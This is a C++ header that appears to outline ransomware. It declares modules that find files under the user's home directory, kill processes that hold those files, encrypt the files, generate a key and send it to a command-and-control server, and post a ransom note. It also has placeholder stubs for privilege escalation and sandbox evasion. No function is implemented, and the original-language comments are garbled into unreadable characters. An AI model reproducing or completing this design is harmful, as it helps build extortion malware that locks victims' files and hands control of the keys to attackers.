//shared_ptr<vector<>>

// All about files
class FileModule
{
private:
    int KillActiveFile() const; // ������ ������������ �� ���� � ������� �������, ������� ��� �����
    int DirectoryCheck() const; // ���� ���������� �� ����� ���������, ����������  0

    path_t directory; // ����������, ������� ����� ����� FindDirectory
    size_t fileOrder; // ����� �������� ����� ����� ������� ������ ����� GetNextFile ��� ���� ����

public:
    FileModule();  // ��������� ����������� 
    void FindDirectory(); // ���� ���������� ����������, �� ������� � ��� ���� ����� "C:\Users\{Username}\" � ���������� � ������� directory
    path_t GetNextFile() const; // ���������� ��������� ����, ������� ���������� ����������� ���� Null ���� �����������
};

// All about cipher
class CipherModule
{
public:
    std::string key;
    CipherModule(std::string key); // ��������� ����������� ��������� ���� ������� ���� �� ���������, �� ������� ��� � ������� key
    int Cipher(path_t file) const; // ������� ���� ������� ���� �����������, ��������� 0 ���� �� ��
};

// Generate cipher key and send it to the specified C2
class KeyModule
{
public:
    std::string key;
    KeyModule(std::string C2Address); // ������� ���� ������� ������� ����
    void KeyGen(); // ������� � ������� key ����������� ����
    int SendKey() const; // �������� ���� �� ������ ��������� ��� �������� ������� ������
};

// Block everything and create a desktop shity note // ���� �������� ���, ����� ����� ���� ���������
class NoteModule
{
public:
    NoteModule();
    void MakeSomeShit(); // ������� � ����� �� � ������� �������
};

// Escalate our privileges to local admin if not already
// class PrivEscModule { # ToDo # };

// Check if we are in a sandbox and if true > do nothing  
// class SandboxEvasionModule { # ToDo # };

class FileSearch {

};